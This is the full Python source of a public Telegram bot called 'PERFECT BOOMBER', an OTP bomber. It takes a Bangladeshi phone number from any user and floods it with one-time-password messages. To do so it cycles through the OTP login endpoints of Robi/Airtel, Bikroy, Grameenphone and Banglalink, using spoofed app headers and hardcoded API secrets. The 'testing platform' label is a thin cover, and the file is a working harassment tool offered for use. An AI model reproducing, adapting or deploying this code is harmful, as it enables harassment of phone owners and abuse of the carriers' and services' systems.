import asyncio
import logging
import json
import os
from keep_alive import keep_alive
keep_alive()
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import threading
import requests
import uuid
import time

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration file
CONFIG_FILE = "config.json"

# Global variables
active_sessions = {}
session_history = {}
bot_config = {}

# --- Configuration Management ---
def load_config():
    """Load configuration from file"""
    global bot_config
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                bot_config = json.load(f)
                logger.info("Configuration loaded successfully")
                return True
        return False
    except Exception as e:
        logger.error(f"Error loading config: {e}")
        return False

def save_config():
    """Save configuration to file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(bot_config, f, indent=4)
        logger.info("Configuration saved successfully")
        return True
    except Exception as e:
        logger.error(f"Error saving config: {e}")
        return False

def setup_config():
    """Non-interactive config for cloud deployment"""
    print("\n" + "="*50)
    print("🤖 OTP Bomber Bot - Auto Setup (Render mode)")
    print("="*50)

    import os
    bot_token = os.getenv("BOT_TOKEN")

    if not bot_token:
        print("❌ BOT_TOKEN not found in environment variables!")
        return False

    bot_config['bot_token'] = bot_token
    bot_config['setup_complete'] = True

    if save_config():
        print("✅ Configuration saved successfully!")
        print(f"   Bot Token: {bot_token[:10]}...{bot_token[-5:]}")
        print("🚀 Starting bot...")
        return True
    else:
        print("❌ Failed to save configuration!")
        return False

# --- OTP Bombing Engine ---
SLEEP_TIME = 1
MAX_GLOBAL_REQUESTS = 60

TARGET_APIS = [
    {
        "name": "Robi/Airtel API",
        "method": "POST",
        "url": "https://myairtel-prod.robi.com.bd/api/v1/customer/auth/otp/login",
        "payload_key": "login",
        "active": True, "hit_count": 0,
        "headers": {
            "User-Agent": "Airtel/10.8.0/android/33/DATA/1dcc405c17e6e8b5/GLOBAL/ac81db1b70be46322b74c661b5549a16",
            "Content-Type": "application/json; charset=UTF-8", "Accept-Language": "bn",
            "Connection": "Keep-Alive"
        }
    },
    {
        "name": "Bikroy API",
        "method": "GET", 
        "url": "https://api.bikroy.com/v1/verifications/phone_login",
        "payload_key": "phone",
        "active": True, "hit_count": 0,
        "headers": {
            "application-version": "384", "application-name": "android",
            "user-agent": "Bikroy 1.5.66/384 (Android 13/33; INFINIX/Infinix X6831; 1080x2232/480; Robi) Release",
            "content-type": "application/json", "accept-encoding": "gzip",
            "application-identifier": str(uuid.uuid4())
        }
    },
    {
        "name": "Grameenphone (MyGP) API",
        "method": "GET", 
        "url": "https://mygp.grameenphone.com/mygpapi/v2/otp-login",
        "payload_key": "query_param_88",
        "active": True, "hit_count": 0,
        "headers": {
             "User-Agent": "Android/33 MyGP/475 (en)", "X-REFERENCE-ID": str(uuid.uuid4())[:16],
             "Accept-Language": "en", "Vary": "Accept-Language",
             "Cache-Control": "no-cache", "Accept-Encoding": "gzip",
        }
    },
    {
        "name": "Banglalink (MyBL) API",
        "method": "POST",
        "url": "https://myblapi.banglalink.net/auth-service/api/v1/guest/send-otp",
        "payload_key": "msisdn_with_88",
        "active": True, "hit_count": 0,
        "headers": {
            "Accept": "application/json", "platform": "android",
            "Accept-Language": "en", "version-code": "1130000",
            "app-version": "11.30.0", "api-client-pass": "1E6F751EBCD16B4B719E76A34FBA9",
            "X-Device-Info": "INFINIX,Infinix X6831,13",
            "Content-Type": "application/json; charset=UTF-8", "User-Agent": "okhttp/5.1.0"
        }
    },
]

class OTPBomber:
    def __init__(self, phone_number, session_id, update_callback=None):
        self.phone_number = phone_number
        self.session_id = session_id
        self.update_callback = update_callback
        self.is_running = False
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': None,
            'end_time': None,
            'active_apis': len(TARGET_APIS)
        }
        
    def send_update(self, message):
        """Send update to Telegram bot"""
        if self.update_callback:
            self.update_callback(self.session_id, message)
    
    def run_bombing(self):
        """Main bombing function"""
        self.is_running = True
        self.stats['start_time'] = datetime.now()
        
        # Send only the essential starting message
        self.send_update(f"🚀 Starting OTP bombing session for: `{self.phone_number}`")
        
        global_request_counter = 0
        
        # Reset API states
        for api in TARGET_APIS:
            api['active'] = True
            api['hit_count'] = 0
        
        while self.is_running:
            active_apis = [api for api in TARGET_APIS if api['active']]
            
            if not active_apis:
                self.send_update("🛑 All APIs are rate-limited or inactive. Stopping session.")
                break
                
            if global_request_counter >= MAX_GLOBAL_REQUESTS:
                self.send_update("✅ Maximum request limit reached. Session completed.")
                break
                
            target = active_apis[global_request_counter % len(active_apis)]
            target['hit_count'] += 1
            global_request_counter += 1
            self.stats['total_requests'] = global_request_counter

            # Prepare request
            api_name = target['name']
            api_url = target['url']
            method = target['method']
            data = None
            
            headers = target['headers'].copy()
            full_msisdn = f"88{self.phone_number}"
            
            # Request preparation
            if target["payload_key"] == "login":
                data = json.dumps({"login": self.phone_number})
            elif target["payload_key"] == "phone":
                api_url = f"{api_url}?phone={self.phone_number}"
            elif target["payload_key"] == "query_param_88":
                headers["APP-MSISDN"] = full_msisdn
                api_url = f"{api_url}?msisdn={full_msisdn}&lang=en&ng=0"
            elif target["payload_key"] == "msisdn_with_88":
                current_timestamp = int(time.time() * 1000)
                device_id = str(uuid.uuid4())
                headers["timestamp"] = str(current_timestamp)
                headers["uid"] = str(uuid.uuid4())
                headers["X-Device-ID"] = device_id
                headers["secret"] = "a620077e88ec0d6f920638043894de70cfd4e015af2b2cdb7e43d8ac3e6e71f9"
                data = json.dumps({"country_code": "88", "msisdn": full_msisdn})
            
            # Send request (no individual API status updates)
            try:
                if method == "POST":
                    response = requests.post(api_url, data=data, headers=headers, timeout=15)
                else:
                    response = requests.get(api_url, headers=headers, timeout=15)

                # Process response (silently, no updates)
                if response.status_code in [200, 201, 202, 204]:
                    self.stats['successful_requests'] += 1
                elif response.status_code == 429:
                    target['active'] = False
                    self.stats['failed_requests'] += 1
                elif 400 <= response.status_code < 500:
                    target['active'] = False
                    self.stats['failed_requests'] += 1
                else:
                    self.stats['failed_requests'] += 1
                    
            except Exception as e:
                self.stats['failed_requests'] += 1
                target['active'] = False

            time.sleep(SLEEP_TIME)
            
        self.stats['end_time'] = datetime.now()
        self.is_running = False
        self.send_final_report()
    
    def send_final_report(self):
        """Send final session report"""
        duration = self.stats['end_time'] - self.stats['start_time']
        success_rate = (self.stats['successful_requests']/self.stats['total_requests']*100) if self.stats['total_requests'] > 0 else 0
        
        report = f"""
📊 **BOMBING SESSION COMPLETE**

📱 Target: `{self.phone_number}`
⏰ Duration: {duration.total_seconds():.1f} seconds
📤 Total Requests: {self.stats['total_requests']}
✅ Successful: {self.stats['successful_requests']}
❌ Failed: {self.stats['failed_requests']}
🎯 Success Rate: {success_rate:.1f}%

Session ID: `{self.session_id}`
        """
        self.send_update(report)
        
        # Store in history
        session_history[self.session_id] = {
            'phone_number': self.phone_number,
            'total_requests': self.stats['total_requests'],
            'successful_requests': self.stats['successful_requests'],
            'failed_requests': self.stats['failed_requests'],
            'duration': duration.total_seconds(),
            'end_time': self.stats['end_time']
        }
    
    def stop(self):
        """Stop the bombing session"""
        self.is_running = False
        self.send_update("🛑 Session stopped by user")

# --- Telegram Bot Functions ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message"""
    keyboard = [
        [InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bombing")],
        [InlineKeyboardButton("📊 Active Sessions", callback_data="active_sessions")],
        [InlineKeyboardButton("📜 Session History", callback_data="session_history")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = """
🤖 **PERFECT BOOMBER** 🚀

*Professional OTP Testing Platform*

Click below to get started!
    """
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
        
    if query.data == "start_bombing":
        await query.edit_message_text(
            "📱 Please send the 11-digit phone number to start bombing:\n\nExample: `01712345678`",
            parse_mode='Markdown'
        )
        context.user_data['awaiting_phone'] = True
        
    elif query.data == "active_sessions":
        await show_active_sessions(query)
        
    elif query.data == "session_history":
        await show_session_history(query)
        
    elif query.data == "settings":
        await show_settings(query)

async def show_active_sessions(query):
    """Show active bombing sessions"""
    if not active_sessions:
        await query.edit_message_text("📭 No active bombing sessions.")
        return
        
    sessions_text = "🚀 **Active Bombing Sessions:**\n\n"
    for session_id, session_data in active_sessions.items():
        bomber = session_data['bomber']
        duration = datetime.now() - bomber.stats['start_time']
        sessions_text += f"""
📱 **Target:** `{bomber.phone_number}`
🆔 **Session ID:** `{session_id}`
📊 **Progress:** {bomber.stats['total_requests']}/{MAX_GLOBAL_REQUESTS}
✅ **Success:** {bomber.stats['successful_requests']}
⏰ **Running:** {duration.total_seconds():.1f}s
---
        """
    
    keyboard = [
        [InlineKeyboardButton("🛑 Stop All", callback_data="stop_all")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(sessions_text, reply_markup=reply_markup, parse_mode='Markdown')

async def show_session_history(query):
    """Show session history"""
    if not session_history:
        await query.edit_message_text("📭 No session history available.")
        return
        
    history_text = "📜 **Session History:**\n\n"
    for session_id, history in list(session_history.items())[-5:]:
        history_text += f"""
📱 Target: `{history['phone_number']}`
📅 Date: {history['end_time'].strftime('%Y-%m-%d %H:%M')}
📊 Requests: {history['total_requests']} | ✅ {history['successful_requests']}
⏰ Duration: {history['duration']:.1f}s
---
        """
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(history_text, reply_markup=reply_markup, parse_mode='Markdown')

async def show_settings(query):
    """Show settings information"""
    settings_text = f"""
⚙️ **Bot Configuration**

🤖 Bot Status: ✅ Running
🎯 Available APIs: {len(TARGET_APIS)}
📈 Max Requests/Session: {MAX_GLOBAL_REQUESTS}

*Configuration File:* `{CONFIG_FILE}`
*Bot Access:* Public
    """
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(settings_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number input and start bombing session"""
    if not context.user_data.get('awaiting_phone'):
        return
        
    phone_number = update.message.text.strip()
    
    # Validate phone number
    if len(phone_number) != 11 or not phone_number.isdigit():
        await update.message.reply_text("❌ Invalid phone number. Please send 11 digits (e.g., 01712345678)")
        return
        
    context.user_data['awaiting_phone'] = False
    
    # Generate session ID
    session_id = str(uuid.uuid4())[:8]
    
    # Create bomber instance
    bomber = OTPBomber(phone_number, session_id, update_callback=send_telegram_update)
    
    # Store session
    active_sessions[session_id] = {
        'bomber': bomber,
        'user_id': update.effective_user.id,
        'start_time': datetime.now()
    }
    
    # Start bombing in separate thread
    thread = threading.Thread(target=bomber.run_bombing)
    thread.daemon = True
    thread.start()
    
    await update.message.reply_text(
        f"**PERFECT BOOMBER:**\n"
        f"🚀 Bombing Session Started\n\n"
        f"📱 Target: `{phone_number}`\n"
        f"🆔 Session ID: `{session_id}`\n"
        f"⏰ Max Requests: {MAX_GLOBAL_REQUESTS}\n"
        f"📊 Target APIs: {len(TARGET_APIS)}\n\n"
        f"Real-time updates will be sent here...",
        parse_mode='Markdown'
    )

def send_telegram_update(session_id, message):
    """Send update to Telegram (called from bombing thread)"""
    if session_id not in active_sessions:
        return
        
    user_id = active_sessions[session_id]['user_id']
    
    # Use asyncio to send message
    async def async_send_update():
        try:
            application = Application.builder().token(bot_config['bot_token']).build()
            await application.bot.send_message(chat_id=user_id, text=message, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Failed to send update: {e}")
    
    # Run in new event loop
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(async_send_update())
        loop.close()
    except:
        pass

async def stop_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop specific bombing session"""
    if not context.args:
        await update.message.reply_text("❌ Usage: `/stop <session_id>`", parse_mode='Markdown')
        return
        
    session_id = context.args[0]
    
    if session_id in active_sessions:
        active_sessions[session_id]['bomber'].stop()
        await update.message.reply_text(f"✅ Session `{session_id}` stopped.", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ Session not found.")

async def stop_all_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop all active sessions"""
    if not active_sessions:
        await update.message.reply_text("📭 No active sessions.")
        return
        
    stopped_count = 0
    for session_id in list(active_sessions.keys()):
        active_sessions[session_id]['bomber'].stop()
        stopped_count += 1
        
    await update.message.reply_text(f"✅ Stopped {stopped_count} sessions.")

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot statistics"""
    total_historical_requests = sum(h['total_requests'] for h in session_history.values())
    total_historical_success = sum(h['successful_requests'] for h in session_history.values())
    
    stats_text = f"""
📊 **Bot Statistics**

🚀 Active Sessions: {len(active_sessions)}
📜 Total Historical Sessions: {len(session_history)}
📈 Total Requests (Historical): {total_historical_requests}
✅ Total Success (Historical): {total_historical_success}
🎯 Available APIs: {len(TARGET_APIS)}
⏰ Request Limit: {MAX_GLOBAL_REQUESTS} per session
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def show_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show current configuration"""
    config_text = f"""
⚙️ **Current Configuration**

🤖 Bot Token: `{bot_config.get('bot_token', '')[:10]}...{bot_config.get('bot_token', '')[-5:]}`
📁 Config File: `{CONFIG_FILE}`
✅ Setup Complete: {bot_config.get('setup_complete', False)}

*Bot is {'✅ RUNNING' if bot_config.get('setup_complete') else '❌ NOT CONFIGURED'}*
*Access: Public*
    """
    
    await update.message.reply_text(config_text, parse_mode='Markdown')

async def handle_back_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle back to main menu"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bombing")],
        [InlineKeyboardButton("📊 Active Sessions", callback_data="active_sessions")],
        [InlineKeyboardButton("📜 Session History", callback_data="session_history")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "🤖 **PERFECT BOOMBER** 🚀\n\nSelect an option:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def stop_all_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop all sessions from callback"""
    query = update.callback_query
    await query.answer()
        
    if not active_sessions:
        await query.edit_message_text("📭 No active sessions to stop.")
        return
        
    stopped_count = 0
    for session_id in list(active_sessions.keys()):
        active_sessions[session_id]['bomber'].stop()
        stopped_count += 1
        
    await query.edit_message_text(f"✅ Stopped {stopped_count} sessions.")

def main():
    """Start the bot"""
    print("🤖 PERFECT BOOMBER - Professional Edition")
    print("="*50)
    
    # Load or setup configuration
    if not load_config() or not bot_config.get('setup_complete'):
        print("🔧 First-time setup required...")
        if not setup_config():
            print("❌ Setup failed. Please try again.")
            return
    
    # Verify configuration
    if not bot_config.get('bot_token'):
        print("❌ Invalid configuration. Please run setup again.")
        return
    
    print("✅ Configuration verified")
    print("🚀 Initializing bot...")
    
    # Create application
    try:
        application = Application.builder().token(bot_config['bot_token']).build()

        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("stop", stop_session))
        application.add_handler(CommandHandler("stop_all", stop_all_sessions))
        application.add_handler(CommandHandler("stats", show_stats))
        application.add_handler(CommandHandler("config", show_config))
        
        application.add_handler(CallbackQueryHandler(button_handler, pattern="^(start_bombing|active_sessions|session_history|settings)$"))
        application.add_handler(CallbackQueryHandler(handle_back_button, pattern="^back_to_main$"))
        application.add_handler(CallbackQueryHandler(stop_all_callback, pattern="^stop_all$"))
        
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number))

        # Start bot
        print("✅ Bot started successfully!")
        print("📱 Send /start to your bot to begin")
        print("⏹️  Press Ctrl+C to stop the bot")
        
        application.run_polling()
        
    except Exception as e:
        print(f"❌ Failed to start bot: {e}")
        print("💡 Please check your bot token and try again.")

if __name__ == '__main__':
    main()